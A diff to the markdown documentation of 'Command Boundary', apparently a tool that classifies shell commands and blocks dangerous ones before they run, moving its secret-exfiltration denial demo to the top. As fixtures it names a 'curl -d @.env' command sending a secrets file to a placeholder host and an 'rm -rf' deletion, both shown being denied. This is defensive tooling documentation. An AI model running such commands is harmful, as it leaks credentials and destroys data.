@@ -1,5 +1,29 @@
 # Command Boundary Demo
 
+`boundary demo command-secret-exfil` is the user-facing Lane 2 demo in
+Boundary's two-lane proof spine. It exercises Command Boundary, a delivered
+preview routed-only surface, by denying a routed secret-exfiltration command
+before execution.
+
+```bash
+boundary demo command-secret-exfil
+```
+
+Expected success signal:
+
+```text
+actual: DENY
+executed=false
+class=C6
+```
+
+The fixture models a routed `curl -d [redacted] https://example.invalid`
+secret-exfiltration command. Boundary classifies and evaluates the command,
+denies it before execution, and emits a decision record. No real `.env` file is
+read, no network call is made, and no live mutation occurs.
+
+## Other Command Boundary Commands
+
 Classify without executing:
 
 ```bash
@@ -18,15 +42,7 @@ Deny a destructive wrapper-routed command before execution:
 boundary command run -- rm -rf fixture-dir
 ```
 
-Run the Command Boundary secret-exfil denial demo (the user-facing Lane 2 demo):
-
-```bash
-boundary demo command-secret-exfil
-```
-
-A routed `curl -d @.env …` secret exfiltration is denied before execution
-(`executed=false`, `class=C6`) with a decision record. The underlying
-fixture/evidence path is the red-team pack:
+The underlying fixture/evidence path for Lane 2 is the red-team pack:
 
 ```bash
 boundary redteam --pack command-secret-exfil
